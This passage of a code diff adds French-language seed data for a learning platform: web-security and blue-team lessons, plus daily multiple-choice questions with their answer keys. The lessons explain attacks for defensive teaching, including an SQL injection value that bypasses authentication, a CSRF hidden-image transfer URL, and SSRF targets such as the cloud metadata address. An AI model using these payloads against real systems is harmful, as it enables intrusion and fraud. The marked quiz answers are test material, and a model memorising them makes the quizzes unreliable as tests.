+          "Trois familles : **Stored** (le script malveillant est enregistré en base et affiché à chaque visiteur), **Reflected** (le script vient d'un paramètre d'URL renvoyé directement dans la page), **DOM-based** (la faille est purement côté client, dans du JS qui manipule le DOM avec des données non fiables). Défense principale : **échapper systématiquement** tout contenu utilisateur affiché (encoder `<`, `>`, `&`...), et utiliser une **Content Security Policy** restrictive en défense supplémentaire.",
+        xpReward: 25,
+        questions: [
+          {
+            order: 1,
+            prompt: "Qu'est-ce qui rend une application vulnérable au XSS ?",
+            choices: [
+              "Utiliser une base de données SQL",
+              "Afficher du contenu fourni par un utilisateur sans l'échapper, permettant l'exécution de JavaScript arbitraire dans le navigateur d'une victime",
+              "Avoir un mot de passe trop court",
+              "Utiliser HTTPS au lieu de HTTP",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Le XSS exploite précisément l'absence d'échappement du contenu utilisateur affiché — sans neutralisation, ce contenu peut contenir du HTML/JS interprété par le navigateur de la victime.",
+          },
+          {
+            order: 2,
+            prompt: "Quelle est la différence entre un XSS « Stored » et un XSS « Reflected » ?",
+            choices: [
+              "Aucune différence réelle",
+              "Le Stored enregistre le script malveillant en base (affecte chaque visiteur) ; le Reflected vient d'un paramètre d'URL renvoyé directement dans la réponse",
+              "Le Reflected est toujours plus dangereux que le Stored",
+              "Le Stored ne fonctionne que sur des sites sans base de données",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Un XSS Stored persiste en base de données et touche potentiellement tous les visiteurs de la page concernée ; un Reflected dépend d'un lien piégé contenant le payload dans l'URL, envoyé à une victime spécifique.",
+          },
+        ],
+      },
+      {
+        order: 2,
+        title: "Injection SQL",
+        content:
+          "L'**injection SQL** survient quand une entrée utilisateur est concaténée directement dans une requête SQL, permettant de modifier la logique de la requête elle-même.\n\n" +
+          "```js\n// VULNÉRABLE — ne jamais faire ça\nconst query = `SELECT * FROM users WHERE email = '${email}'`;\n// Si email = \"' OR '1'='1\", la requête devient :\n// SELECT * FROM users WHERE email = '' OR '1'='1'\n// → retourne TOUS les utilisateurs, contournant l'authentification\n```\n\n" +
+          "Défense : les **requêtes préparées** (paramétrées) séparent strictement le code SQL des données fournies — la base de données ne peut jamais interpréter une donnée comme du code SQL, quelle que soit la valeur envoyée.\n\n" +
+          "```js\n// SÛR\ndb.query('SELECT * FROM users WHERE email = ?', [email]);\n```\n\n" +
+          "Un ORM bien utilisé (voir le cours SQL/ORM) génère des requêtes paramétrées par défaut — c'est l'une des raisons pour lesquelles il protège nativement contre l'injection SQL, sans effort supplémentaire du développeur.",
+        xpReward: 30,
+        questions: [
+          {
+            order: 1,
+            prompt: "Pourquoi `SELECT * FROM users WHERE email = '${email}'` (concaténation directe) est-il dangereux ?",
+            choices: [
+              "Ce n'est pas dangereux, c'est juste moins performant",
+              "Un attaquant peut fournir une valeur qui modifie la structure même de la requête SQL exécutée",
+              "Ça ne fonctionne qu'avec des bases de données NoSQL",
+              "Ça ralentit systématiquement la requête",
+            ],
+            correctIndex: 1,
+            explanation:
+              "La concaténation directe traite l'entrée utilisateur comme du code SQL — une valeur comme `' OR '1'='1` change la logique de la clause `WHERE` elle-même, pas juste sa valeur.",
+          },
+          {
+            order: 2,
+            prompt: "Pourquoi une requête préparée (paramétrée) empêche-t-elle l'injection SQL ?",
+            choices: [
+              "Elle chiffre automatiquement toutes les données",
+              "Elle sépare strictement le code SQL des données fournies — la base ne peut jamais interpréter une donnée comme du code",
+              "Elle est simplement plus rapide à exécuter",
+              "Elle empêche toute connexion à la base de données",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Avec une requête paramétrée, la structure SQL est fixée à l'avance et les valeurs sont transmises séparément — même une valeur malveillante reste traitée comme une simple donnée, jamais comme du code exécutable.",
+          },
+        ],
+      },
+      {
+        order: 3,
+        title: "CSRF et SSRF",
+        content:
+          "**CSRF** (Cross-Site Request Forgery) : un site malveillant fait exécuter une requête non désirée par le navigateur d'une victime déjà authentifiée sur un autre site (le navigateur envoie automatiquement les cookies de session existants). Ex: une image cachée pointant vers `banque.com/transferer?montant=1000&vers=attaquant` — si la victime est connectée à sa banque, la requête part avec ses cookies valides. Défense : tokens CSRF (valeur imprévisible incluse dans chaque formulaire, vérifiée côté serveur) et attribut de cookie `SameSite`.\n\n" +
+          "**SSRF** (Server-Side Request Forgery) : le serveur lui-même est manipulé pour effectuer une requête vers une destination contrôlée ou choisie par l'attaquant — souvent via une fonctionnalité légitime (« importer une image depuis une URL »). Un attaquant peut cibler `http://localhost/admin` ou des métadonnées cloud internes (`http://169.254.169.254/`), normalement inaccessibles depuis l'extérieur mais accessibles depuis le serveur lui-même. Défense : valider/restreindre strictement les URLs autorisées (liste blanche de domaines), jamais faire confiance à une URL fournie par l'utilisateur sans filtrage.",
+        xpReward: 30,
+        questions: [
+          {
+            order: 1,
+            prompt: "Dans une attaque CSRF, pourquoi le navigateur de la victime envoie-t-il une requête authentifiée sans que la victime le sache ?",
+            choices: [
+              "Le navigateur envoie automatiquement les cookies de session existants avec toute requête vers le domaine concerné, même déclenchée depuis un autre site",
+              "L'attaquant a volé le mot de passe de la victime au préalable",
+              "CSRF ne fonctionne que si la victime clique explicitement sur un bouton « autoriser »",
+              "Le navigateur demande toujours confirmation avant d'envoyer une requête",
+            ],
+            correctIndex: 0,
+            explanation:
+              "C'est précisément le mécanisme exploité : le navigateur attache automatiquement les cookies existants à toute requête vers le domaine correspondant, peu importe la page qui a déclenché la requête.",
+          },
+          {
+            order: 2,
+            prompt: "Qu'est-ce qui distingue le SSRF du CSRF ?",
+            choices: [
+              "Ce sont des synonymes exacts",
+              "Dans le SSRF, c'est le SERVEUR lui-même qui est manipulé pour faire une requête (souvent vers des ressources internes normalement inaccessibles), pas le navigateur d'une victime",
+              "Le SSRF ne concerne que les bases de données",
+              "Le CSRF est toujours plus dangereux que le SSRF",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Le CSRF exploite le navigateur d'une victime authentifiée ; le SSRF exploite le serveur lui-même via une fonctionnalité légitime détournée, pour atteindre des ressources internes normalement protégées du réseau externe.",
+          },
+        ],
+      },
+    ],
+  },
+  {
+    key: "blue-team-fundamentals",
+    title: "Blue Team : détection et réponse",
+    description: "L'autre côté de la cybersécurité : analyser des logs, détecter des indicateurs de compromission, réagir à un incident et durcir un système.",
+    category: "CYBERSECURITY",
+    skillKey: "blue-team-fundamentals",
+    level: 3,
+    prerequisiteCourseKeys: ["cyber-fundamentals"],
+    lessons: [
+      {
+        order: 1,
+        title: "Analyse de logs et IOC",
+        content:
+          "Un **IOC** (Indicator Of Compromise) est un signal observable qui suggère une compromission possible : une adresse IP suspecte, un hash de fichier malveillant connu, une connexion à une heure inhabituelle, un volume de trafic anormal.\n\n" +
+          "Exemple de log suspect à repérer : une authentification réussie à 03h14 un dimanche depuis un pays sans employé de l'entreprise, immédiatement suivie d'un accès à des fichiers sensibles jamais consultés par ce compte auparavant — chaque élément pris seul est faible, mais leur combinaison forme un signal fort.\n\n" +
+          "Les analystes blue team ne cherchent pas qu'un événement isolé mais des **patterns** : plusieurs échecs de connexion suivis d'un succès (indice de brute force réussi), une même IP touchant des dizaines de comptes différents (credential stuffing), un processus normal (`powershell.exe`) lancé depuis un emplacement inhabituel (indice de détournement d'un outil légitime, technique dite « living off the land »).",
+        xpReward: 25,
+        questions: [
+          {
+            order: 1,
+            prompt: "Que signifie l'acronyme IOC en cybersécurité ?",
+            choices: [
+              "Internet Origin Control",
+              "Indicator Of Compromise",
+              "Internal Operations Center",
+              "Isolated Object Container",
+            ],
+            correctIndex: 1,
+            explanation:
+              "IOC = Indicator Of Compromise, un signal observable (IP, hash, comportement) qui suggère qu'un système a potentiellement été compromis.",
+          },
+          {
+            order: 2,
+            prompt: "Pourquoi un analyste blue team cherche-t-il des « patterns » plutôt qu'un seul événement isolé ?",
+            choices: [
+              "Un seul événement suffit toujours à confirmer une attaque",
+              "Un événement isolé est souvent faible en soi, mais la combinaison de plusieurs signaux (heure inhabituelle, comportement anormal, échecs répétés) forme un signal bien plus fiable",
+              "Les logs individuels ne contiennent jamais d'information utile",
+              "Chercher des patterns ralentit toujours la détection",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Un seul indicateur (ex: une connexion à 3h du matin) peut avoir une explication légitime — c'est la corrélation de plusieurs signaux anormaux ensemble qui rend la détection fiable et actionnable.",
+          },
+        ],
+      },
+      {
+        order: 2,
+        title: "SIEM et détection",
+        content:
+          "Un **SIEM** (Security Information and Event Management) centralise les logs de multiples sources (serveurs, pare-feux, applications, endpoints) pour permettre une corrélation à grande échelle — impossible à faire manuellement sur des millions d'événements par jour.\n\n" +
+          "Le SIEM applique des **règles de détection** : des conditions qui, si satisfaites, génèrent une alerte. Ex: « plus de 10 échecs de connexion sur le même compte en moins de 5 minutes » ou « connexion réussie depuis deux pays différents à moins d'une heure d'intervalle » (« impossible travel »).\n\n" +
+          "Un défi majeur : le réglage des règles. Trop sensibles → **faux positifs** massifs qui noient les analystes (fatigue d'alerte, un vrai incident peut passer inaperçu dans le bruit) ; trop larges → **faux négatifs**, de vraies attaques non détectées. Affiner les règles de détection est un travail continu, pas une configuration figée une fois pour toutes.",
+        xpReward: 25,
+        questions: [
+          {
+            order: 1,
+            prompt: "Quel est le rôle principal d'un SIEM ?",
+            choices: [
+              "Bloquer automatiquement toutes les attaques sans intervention humaine",
+              "Centraliser les logs de multiples sources pour permettre une corrélation et une détection à grande échelle",
+              "Remplacer entièrement le besoin d'un pare-feu",
+              "Chiffrer les communications réseau",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Un SIEM agrège et corrèle des logs venant de nombreuses sources différentes — un volume qu'aucun analyste ne pourrait traiter manuellement en temps réel sans cet outil.",
+          },
+          {
+            order: 2,
+            prompt: "Quel est le risque concret d'avoir des règles de détection SIEM trop sensibles ?",
+            choices: [
+              "Aucun risque, plus de sensibilité est toujours préférable",
+              "Un volume massif de faux positifs qui noie les analystes (fatigue d'alerte), risquant de faire passer un vrai incident inaperçu dans le bruit",
+              "Le SIEM cesse complètement de fonctionner",
+              "Ça ralentit uniquement les performances réseau",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Des règles trop larges génèrent trop d'alertes non pertinentes — les analystes finissent par ignorer ou traiter superficiellement les alertes par lassitude, ce qui peut masquer une vraie menace parmi le bruit.",
+          },
+        ],
+      },
+      {
+        order: 3,
+        title: "Réponse à incident et hardening",
+        content:
+          "La **réponse à incident** suit généralement un cycle en phases : **Préparation** (plans, outils, formations avant qu'un incident survienne) → **Détection/Analyse** (confirmer et qualifier l'incident) → **Confinement** (isoler les systèmes touchés pour empêcher la propagation) → **Éradication** (supprimer la cause : malware, accès non autorisé) → **Récupération** (restaurer les systèmes sains, en confiance) → **Retour d'expérience** (documenter ce qui s'est passé pour améliorer la préparation future).\n\n" +
+          "Le **hardening** (durcissement) est l'ensemble des mesures préventives qui réduisent la surface d'attaque avant même qu'un incident survienne : désactiver les services inutilisés, appliquer le principe du **moindre privilège** (chaque compte/service n'a que les accès strictement nécessaires), maintenir les correctifs de sécurité à jour, désactiver les comptes/mots de passe par défaut. Le hardening et la réponse à incident sont complémentaires : mieux un système est durci, moins d'incidents surviennent — mais aucun système n'est invulnérable, d'où la nécessité d'un plan de réponse prêt à l'avance plutôt qu'improvisé en pleine crise.",
+        xpReward: 30,
+        questions: [
+          {
+            order: 1,
+            prompt: "Dans le cycle de réponse à incident, que se passe-t-il durant la phase de « Confinement » ?",
+            choices: [
+              "On restaure immédiatement tous les systèmes à leur état normal",
+              "On isole les systèmes touchés pour empêcher la propagation de l'incident, avant de chercher à l'éliminer complètement",
+              "On documente uniquement ce qui s'est passé pour plus tard",
+              "On désactive tous les logs pour éviter d'aggraver la situation",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Le confinement vient avant l'éradication : l'objectif immédiat est d'empêcher l'incident de s'étendre à d'autres systèmes, avant de chercher à supprimer sa cause racine.",
+          },
+          {
+            order: 2,
+            prompt: "Qu'est-ce que le « principe du moindre privilège » dans une démarche de hardening ?",
+            choices: [
+              "Donner à chaque compte/service uniquement les accès strictement nécessaires à sa fonction, rien de plus",
+              "Donner un accès administrateur à tous les comptes par défaut pour simplifier la gestion",
+              "Interdire complètement tout accès à tous les systèmes",
+              "Un principe qui ne s'applique qu'aux mots de passe",
+            ],
+            correctIndex: 0,
+            explanation:
+              "Le moindre privilège réduit la surface d'attaque : si un compte est compromis, l'attaquant n'hérite que des accès strictement nécessaires à ce compte, pas de privilèges superflus qui élargiraient les dégâts possibles.",
           },
         ],
       },
@@ -3449,16 +5291,290 @@ const DAILY_QUESTIONS: DailyQuestionSeed[] = [
     correctIndex: 1,
     explanation: "Utiliser massivement des services propriétaires spécifiques à un fournisseur facilite le développement à court terme, mais complique une éventuelle migration future.",
   },
+  {
+    key: "js-nan-typeof",
+    category: "DEVELOPMENT",
+    prompt: "En JavaScript, que retourne `typeof NaN` ?",
+    choices: ["\"nan\"", "\"undefined\"", "\"number\"", "\"object\""],
+    correctIndex: 2,
+    explanation: "NaN (Not a Number) est, paradoxalement, du type `number` en JavaScript — c'est une valeur numérique spéciale représentant un résultat non calculable.",
+  },
+  {
+    key: "http-status-201",
+    category: "DEVELOPMENT",
+    prompt: "Que signifie le code de statut HTTP `201` ?",
+    choices: ["Requête invalide", "Ressource créée avec succès", "Ressource introuvable", "Erreur serveur"],
+    correctIndex: 1,
+    explanation: "201 Created est renvoyé typiquement après un `POST` qui a réussi à créer une nouvelle ressource, souvent avec l'URL de la ressource créée dans l'en-tête `Location`.",
+  },
+  {
+    key: "css-important-purpose",
+    category: "DEVELOPMENT",
+    prompt: "À quoi sert `!important` en CSS ?",
+    choices: ["À accélérer le rendu de la page", "À forcer une règle CSS à outrepasser la spécificité normale des autres règles", "À valider automatiquement le CSS", "À importer un fichier externe"],
+    correctIndex: 1,
+    explanation: "`!important` outrepasse la cascade normale de spécificité CSS — généralement déconseillé sauf cas exceptionnel, car il rend le débogage des styles plus difficile.",
+  },
+  {
+    key: "python-mutable-default-arg",
+    category: "DEVELOPMENT",
+    prompt: "Pourquoi utiliser une liste vide `[]` comme valeur par défaut d'un paramètre de fonction Python (`def f(items=[])`) est risqué ?",
+    choices: ["Ça lève toujours une erreur", "La même liste est partagée entre tous les appels de la fonction n'ayant pas fourni cet argument", "Les listes ne peuvent pas être des paramètres par défaut", "Ça ralentit systématiquement l'exécution"],
+    correctIndex: 1,
+    explanation: "En Python, la valeur par défaut est évaluée une seule fois à la définition de la fonction — une liste mutable modifiée dans un appel reste modifiée pour tous les appels suivants.",
+  },
+  {
+    key: "sql-null-comparison",
+    category: "DEVELOPMENT",
+    prompt: "Pourquoi `WHERE colonne = NULL` ne fonctionne-t-il jamais comme attendu en SQL ?",
+    choices: ["C'est une erreur de syntaxe", "NULL représente une valeur inconnue — aucune comparaison avec `=` ne peut être vraie, il faut utiliser `IS NULL`", "NULL est traité comme 0 automatiquement", "Ça fonctionne parfaitement normalement"],
+    correctIndex: 1,
+    explanation: "NULL signifie 'valeur inconnue' — comparer une inconnue à une autre valeur avec `=` donne toujours un résultat indéterminé (ni vrai ni faux), d'où la nécessité de `IS NULL`/`IS NOT NULL`.",
+  },
+  {
+    key: "git-stash-purpose",
+    category: "DEVELOPMENT",
+    prompt: "À quoi sert `git stash` ?",
+    choices: ["Supprimer définitivement les modifications non commitées", "Mettre de côté temporairement des modifications non commitées pour changer de branche proprement, sans les committer", "Créer une nouvelle branche", "Fusionner deux branches"],
+    correctIndex: 1,
+    explanation: "`git stash` range les modifications en cours dans une pile temporaire, laissant l'arbre de travail propre — pratique pour changer de branche rapidement sans committer un travail inachevé.",
+  },
+  {
+    key: "npm-package-lock-purpose",
+    category: "DEVELOPMENT",
+    prompt: "À quoi sert le fichier `package-lock.json` dans un projet Node.js ?",
+    choices: ["C'est un fichier optionnel sans réelle utilité", "Il fige les versions exactes de toutes les dépendances (y compris transitives) pour garantir des installations reproductibles", "Il remplace complètement `package.json`", "Il contient le code source compilé"],
+    correctIndex: 1,
+    explanation: "Sans lockfile, deux installations à des moments différents pourraient récupérer des versions mineures différentes de dépendances transitives — le lockfile garantit une installation identique partout.",
+  },
+  {
+    key: "rest-http-put-vs-patch",
+    category: "DEVELOPMENT",
+    prompt: "Quelle est la différence conventionnelle entre `PUT` et `PATCH` en REST ?",
+    choices: ["Aucune différence, ce sont des synonymes", "`PUT` remplace la ressource entière, `PATCH` applique une modification partielle", "`PATCH` ne fonctionne que sur des fichiers", "`PUT` est utilisé uniquement pour la lecture"],
+    correctIndex: 1,
+    explanation: "Par convention REST, `PUT` envoie la représentation complète de la ressource à remplacer, tandis que `PATCH` n'envoie que les champs à modifier.",
+  },
+  {
+    key: "async-callback-hell",
+    category: "DEVELOPMENT",
+    prompt: "Que désigne l'expression 'callback hell' en JavaScript ?",
+    choices: ["Un bug rare du moteur V8", "Un empilement de callbacks imbriqués rendant le code asynchrone difficile à lire et maintenir", "Une erreur de syntaxe spécifique", "Une technique d'optimisation recommandée"],
+    correctIndex: 1,
+    explanation: "Avant les Promises/async-await, enchaîner plusieurs opérations asynchrones dépendantes via des callbacks imbriqués créait un code en forme de pyramide, difficile à lire et à déboguer.",
+  },
+  {
+    key: "xxe-injection-def",
+    category: "CYBERSECURITY",
+    prompt: "Qu'est-ce qu'une injection XXE (XML External Entity) ?",
+    choices: ["Une attaque qui exploite un parseur XML mal configuré pour lire des fichiers locaux ou faire des requêtes internes", "Un type de chiffrement XML", "Une extension de navigateur malveillante", "Un format d'export de base de données"],
+    correctIndex: 0,
+    explanation: "Un parseur XML qui résout les entités externes sans restriction peut être détourné pour lire des fichiers système (`/etc/passwd`) ou faire des requêtes SSRF depuis le serveur.",
+  },
+  {
+    key: "insecure-deserialization-def",
+    category: "CYBERSECURITY",
+    prompt: "Pourquoi désérialiser des données non fiables sans validation est-il dangereux ?",
+    choices: ["Ce n'est jamais dangereux, uniquement lent", "Un objet sérialisé malveillant peut, selon le langage/la bibliothèque, exécuter du code arbitraire pendant sa reconstruction", "Ça affecte uniquement les performances réseau", "Ça ne concerne que les fichiers CSV"],
+    correctIndex: 1,
+    explanation: "Certains formats de sérialisation (pickle en Python, certaines libs Java) peuvent exécuter du code pendant la désérialisation — ne jamais désérialiser des données venant d'une source non fiable sans validation stricte.",
+  },
+  {
+    key: "clickjacking-defense",
+    category: "CYBERSECURITY",
+    prompt: "Quelle en-tête HTTP protège spécifiquement contre le clickjacking en empêchant le chargement d'une page dans une iframe ?",
+    choices: ["Content-Type", "X-Frame-Options", "Accept-Language", "Cache-Control"],
+    correctIndex: 1,
+    explanation: "`X-Frame-Options` (ou la directive CSP `frame-ancestors`, plus moderne) indique au navigateur de refuser d'afficher la page dans une iframe sur un autre domaine.",
+  },
+  {
+    key: "two-factor-vs-mfa",
+    category: "CYBERSECURITY",
+    prompt: "Quelle est la relation entre 2FA et MFA ?",
+    choices: ["Ce sont des concepts totalement différents et sans rapport", "2FA (deux facteurs) est un cas particulier de MFA (authentification multi-facteurs, deux ou plus)", "MFA est un cas particulier de 2FA", "MFA ne concerne que les mots de passe"],
+    correctIndex: 1,
+    explanation: "MFA (Multi-Factor Authentication) désigne l'usage d'au moins deux facteurs d'authentification différents — 2FA (Two-Factor Authentication) en est le cas le plus courant avec exactement deux facteurs.",
+  },
+  {
+    key: "air-gapped-system-def",
+    category: "CYBERSECURITY",
+    prompt: "Qu'est-ce qu'un système 'air-gapped' ?",
+    choices: ["Un système avec un ventilateur de refroidissement puissant", "Un système physiquement isolé de tout réseau non sécurisé (y compris internet), pour une sécurité maximale", "Un synonyme de pare-feu logiciel", "Un type de connexion sans fil"],
+    correctIndex: 1,
+    explanation: "L'air-gapping isole physiquement un système sensible (aucune connexion réseau, même indirecte) — utilisé pour des systèmes critiques où le risque d'une compromission distante doit être éliminé structurellement.",
+  },
+  {
+    key: "cyber-kill-chain-def",
+    category: "CYBERSECURITY",
+    prompt: "Que décrit le modèle de la 'Cyber Kill Chain' ?",
+    choices: ["Les étapes successives d'une cyberattaque, de la reconnaissance initiale jusqu'à l'objectif final de l'attaquant", "Un algorithme de chiffrement", "Une liste de mots de passe interdits", "Un protocole réseau"],
+    correctIndex: 0,
+    explanation: "Développé par Lockheed Martin, ce modèle décompose une attaque en phases (reconnaissance, intrusion, exploitation, installation, commande et contrôle, actions sur objectifs) pour aider à détecter et bloquer une attaque à chaque étape.",
+  },
+  {
+    key: "port-scanning-purpose",
+    category: "NETWORKING",
+    prompt: "À quoi sert un scan de ports (ex: avec nmap) ?",
+    choices: ["Chiffrer le trafic réseau", "Identifier quels ports/services sont ouverts et accessibles sur une machine cible", "Augmenter la bande passante disponible", "Créer automatiquement un VPN"],
+    correctIndex: 1,
+    explanation: "Un scan de ports teste systématiquement une plage de ports pour déterminer lesquels répondent (ouverts) — utilisé en pentest légitime pour cartographier une surface d'attaque, ou par un attaquant pour reconnaissance.",
+  },
+  {
+    key: "http-header-user-agent",
+    category: "NETWORKING",
+    prompt: "À quoi sert l'en-tête HTTP `User-Agent` ?",
+    choices: ["Il identifie le logiciel client (navigateur, app) qui fait la requête", "Il contient le mot de passe de l'utilisateur", "Il définit le format de la réponse attendue", "Il chiffre la requête"],
+    correctIndex: 0,
+    explanation: "`User-Agent` déclare l'identité du client effectuant la requête (ex: nom et version du navigateur) — utile pour l'analytics ou l'adaptation du contenu, mais falsifiable et non fiable pour de la sécurité.",
+  },
+  {
+    key: "packet-vs-frame",
+    category: "NETWORKING",
+    prompt: "Quelle est la différence entre un 'paquet' et une 'trame' (frame) en réseau ?",
+    choices: ["Ce sont des synonymes exacts", "Le paquet est l'unité de données à la couche réseau (IP), la trame à la couche liaison (Ethernet) — la trame encapsule le paquet", "La trame n'existe que sur le Wi-Fi", "Le paquet est toujours plus petit que la trame"],
+    correctIndex: 1,
+    explanation: "Chaque couche du modèle réseau encapsule les données de la couche supérieure dans sa propre unité : un paquet IP (couche 3) est encapsulé dans une trame Ethernet (couche 2) pour être transmis physiquement.",
+  },
+  {
+    key: "ssl-certificate-purpose",
+    category: "NETWORKING",
+    prompt: "À quoi sert un certificat SSL/TLS ?",
+    choices: ["À accélérer le chargement d'une page", "À prouver l'identité d'un serveur et permettre le chiffrement de la connexion HTTPS", "À stocker des cookies", "À bloquer les publicités"],
+    correctIndex: 1,
+    explanation: "Un certificat, délivré par une autorité de certification, permet au navigateur de vérifier qu'il communique bien avec le bon serveur (pas un intermédiaire malveillant) et d'établir une connexion chiffrée.",
+  },
+  {
+    key: "dhcp-lease-def",
+    category: "NETWORKING",
+    prompt: "Qu'est-ce qu'un 'bail DHCP' (DHCP lease) ?",
+    choices: ["Un contrat légal d'accès internet", "La durée pendant laquelle une adresse IP attribuée automatiquement par DHCP reste valide avant renouvellement", "Un type de câble réseau", "Un protocole de chiffrement"],
+    correctIndex: 1,
+    explanation: "DHCP attribue une adresse IP pour une durée limitée (le bail) — le client doit la renouveler périodiquement, ce qui permet de récupérer les adresses des appareils déconnectés pour les réattribuer.",
+  },
+  {
+    key: "ai-training-vs-inference",
+    category: "AI",
+    prompt: "Quelle est la différence entre 'entraînement' et 'inférence' pour un modèle d'IA ?",
+    choices: ["Ce sont des synonymes", "L'entraînement ajuste les paramètres du modèle à partir de données, l'inférence utilise le modèle déjà entraîné pour générer une réponse sur une nouvelle entrée", "L'inférence précède toujours l'entraînement", "L'entraînement n'existe que pour les LLM"],
+    correctIndex: 1,
+    explanation: "L'entraînement (coûteux, ponctuel) construit le modèle à partir d'énormes volumes de données ; l'inférence (chaque requête utilisateur) utilise ce modèle déjà figé pour produire une sortie, beaucoup moins coûteuse en calcul.",
+  },
+  {
+    key: "ai-parameters-count",
+    category: "AI",
+    prompt: "Que désigne le nombre de 'paramètres' souvent cité pour un grand modèle de langage (ex: '70 milliards de paramètres') ?",
+    choices: ["Le nombre de questions qu'il peut traiter par seconde", "Le nombre de valeurs numériques ajustables internes au réseau de neurones, apprises pendant l'entraînement", "Le nombre de langues supportées", "La taille du disque dur nécessaire uniquement"],
+    correctIndex: 1,
+    explanation: "Les paramètres sont les poids internes du réseau de neurones, ajustés pendant l'entraînement — plus il y en a, plus le modèle peut potentiellement capturer de nuances, au prix d'un besoin de calcul plus important.",
+  },
+  {
+    key: "ai-guardrails-def",
+    category: "AI",
+    prompt: "Que désignent les 'guardrails' (garde-fous) appliqués à un système IA ?",
+    choices: ["Des limites matérielles du processeur", "Des règles/filtres qui contraignent le comportement d'un modèle pour éviter des réponses dangereuses, hors-sujet ou non conformes", "Un synonyme de prompt engineering", "Un type de connexion réseau"],
+    correctIndex: 1,
+    explanation: "Les guardrails encadrent les entrées/sorties d'un système IA (filtrage de contenu, limites de sujets, validation de format) pour réduire les risques de réponses inappropriées, indépendamment du modèle sous-jacent.",
+  },
+  {
+    key: "ai-latency-vs-throughput",
+    category: "AI",
+    prompt: "Quelle est la différence entre 'latence' et 'débit' (throughput) pour une API IA ?",
+    choices: ["Ce sont des synonymes exacts", "La latence mesure le temps pour une seule réponse, le débit mesure combien de requêtes peuvent être traitées par unité de temps", "Le débit ne concerne que le stockage", "La latence ne concerne que les erreurs"],
+    correctIndex: 1,
+    explanation: "Une API peut avoir une latence faible mais un débit limité (répond vite mais peu de requêtes en parallèle), ou l'inverse — les deux métriques sont importantes et souvent en tension selon l'architecture.",
+  },
+  {
+    key: "linux-ps-command",
+    category: "SYSTEMS",
+    prompt: "À quoi sert la commande Linux `ps aux` ?",
+    choices: ["Afficher l'espace disque disponible", "Lister tous les processus en cours d'exécution sur le système", "Modifier les permissions d'un fichier", "Afficher les logs système"],
+    correctIndex: 1,
+    explanation: "`ps aux` liste tous les processus actifs (de tous les utilisateurs), avec des informations comme le PID, l'utilisation CPU/mémoire — un outil de base pour diagnostiquer un système.",
+  },
+  {
+    key: "windows-services-msc",
+    category: "SYSTEMS",
+    prompt: "Sur Windows, quel outil (`services.msc`) permet de voir et gérer les services système en cours d'exécution ?",
+    choices: ["Le Gestionnaire des services", "Le Bloc-notes", "L'Explorateur de fichiers", "Le Panneau de configuration réseau"],
+    correctIndex: 0,
+    explanation: "`services.msc` ouvre le Gestionnaire des services Windows, permettant de démarrer, arrêter ou configurer le démarrage automatique des services système en arrière-plan.",
+  },
+  {
+    key: "linux-tar-command",
+    category: "SYSTEMS",
+    prompt: "À quoi sert principalement la commande Linux `tar` ?",
+    choices: ["Chiffrer un fichier", "Archiver (regrouper) plusieurs fichiers/dossiers en une seule archive, avec compression optionnelle", "Afficher le contenu d'un fichier texte", "Renommer un fichier"],
+    correctIndex: 1,
+    explanation: "`tar` (Tape ARchive) regroupe des fichiers en une seule archive `.tar` — souvent combiné à une compression (`tar -czf archive.tar.gz dossier/`) pour réduire la taille.",
+  },
+  {
+    key: "process-zombie-def",
+    category: "SYSTEMS",
+    prompt: "Qu'est-ce qu'un processus 'zombie' sur un système Unix/Linux ?",
+    choices: ["Un processus malveillant qui infecte d'autres processus", "Un processus terminé dont l'entrée dans la table des processus n'a pas encore été nettoyée par son parent", "Un synonyme de processus en arrière-plan normal", "Un processus qui consomme 100% du CPU"],
+    correctIndex: 1,
+    explanation: "Un processus zombie a fini son exécution, mais son code de sortie n'a pas encore été lu par le processus parent — il reste une entrée résiduelle dans la table des processus jusqu'à ce nettoyage.",
+  },
+  {
+    key: "hard-link-vs-symlink",
+    category: "SYSTEMS",
+    prompt: "Quelle est la différence entre un lien symbolique (symlink) et un lien physique (hard link) ?",
+    choices: ["Ce sont des synonymes exacts", "Le symlink pointe vers un chemin (cassé si la cible est supprimée), le hard link pointe directement vers les mêmes données sur le disque", "Le hard link ne fonctionne que sur Windows", "Le symlink est toujours plus rapide"],
+    correctIndex: 1,
+    explanation: "Un hard link est une référence supplémentaire directe aux mêmes données disque (le fichier original peut être supprimé sans casser le lien) ; un symlink est un simple pointeur vers un chemin, cassé si la cible disparaît.",
+  },
+  {
+    key: "cloud-shared-responsibility",
+    category: "CLOUD",
+    prompt: "Que décrit le 'modèle de responsabilité partagée' dans le cloud ?",
+    choices: ["Le fournisseur cloud est responsable de tout, sans exception", "La répartition des responsabilités de sécurité entre le fournisseur cloud (infrastructure physique) et le client (configuration, données, accès)", "Le client est responsable de tout, y compris le matériel physique", "Un accord légal sans rapport avec la sécurité"],
+    correctIndex: 1,
+    explanation: "Le fournisseur sécurise typiquement 'le cloud' (datacenters, réseau physique, virtualisation), tandis que le client reste responsable de la sécurité 'dans le cloud' (configuration, données, gestion des accès) — une mauvaise configuration côté client reste de sa responsabilité.",
+  },
+  {
+    key: "cloud-region-vs-az",
+    category: "CLOUD",
+    prompt: "Quelle est la différence entre une 'région' et une 'zone de disponibilité' (availability zone) chez un fournisseur cloud ?",
+    choices: ["Ce sont des synonymes exacts", "Une région regroupe plusieurs zones de disponibilité (datacenters physiquement séparés) dans une même zone géographique, pour la redondance", "Une zone de disponibilité contient plusieurs régions", "Ça ne concerne que le stockage de fichiers"],
+    correctIndex: 1,
+    explanation: "Une région (ex: 'Europe de l'Ouest') regroupe plusieurs zones de disponibilité isolées physiquement les unes des autres (alimentation, réseau séparés) — répartir une application sur plusieurs AZ protège contre la panne d'un seul datacenter.",
+  },
+  {
+    key: "cdn-edge-location",
+    category: "CLOUD",
+    prompt: "Qu'est-ce qu'un 'edge location' (point de présence en périphérie) dans le contexte d'un CDN ?",
+    choices: ["Le serveur principal unique de l'application", "Un serveur géographiquement proche de l'utilisateur final, qui met en cache du contenu pour réduire la latence", "Un type de pare-feu", "Une base de données de secours"],
+    correctIndex: 1,
+    explanation: "Un CDN distribue des copies du contenu (souvent statique) sur de nombreux serveurs répartis géographiquement — l'utilisateur récupère le contenu depuis le point le plus proche de lui, réduisant fortement la latence.",
+  },
+  {
